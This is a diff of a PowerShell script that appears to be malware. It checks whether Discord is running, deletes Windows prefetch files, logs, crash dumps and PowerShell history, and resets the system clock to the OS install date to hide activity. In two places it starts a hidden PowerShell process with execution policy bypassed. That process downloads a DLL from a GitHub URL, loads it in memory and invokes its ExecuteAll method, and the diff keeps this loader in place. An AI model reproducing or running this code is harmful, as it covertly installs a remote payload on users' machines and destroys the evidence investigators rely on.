@@ -25,8 +25,8 @@ if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
     Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
     Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     Clear-History -ErrorAction SilentlyContinue
-    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$b = (New-Object System.Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'); $a = [System.Reflection.Assembly]::Load($b); $a.GetType('ServiceManagerApp.MainTool').GetMethod('ExecuteAll').Invoke($null, $null)`""
-    Exit
+   Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
+   Exit
 }
 
 $invokeArgs = New-Object object[] 1 
@@ -34,8 +34,16 @@ $invokeArgs[0] = [string[]]@()
 $entry.Invoke($null, $invokeArgs)
 
 $os = Get-CimInstance Win32_OperatingSystem
-$installDateTime = [Management.ManagementDateTimeConverter]::ToDateTime($os.InstallDate)
-Set-Date -Date $installDateTime
+$installDate = $os.InstallDate
+
+if ($installDate -is [datetime]) {
+    Set-Date -Date $installDate
+} else {
+    $installDate = [System.Management.ManagementDateTimeConverter]::ToDateTime($installDate)
+    Set-Date -Date $installDate
+}
+
+
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
@@ -112,5 +120,5 @@ Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction Silently
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$b = (New-Object System.Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'); $a = [System.Reflection.Assembly]::Load($b); $a.GetType('ServiceManagerApp.MainTool').GetMethod('ExecuteAll').Invoke($null, $null)`""
+Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
 Exit
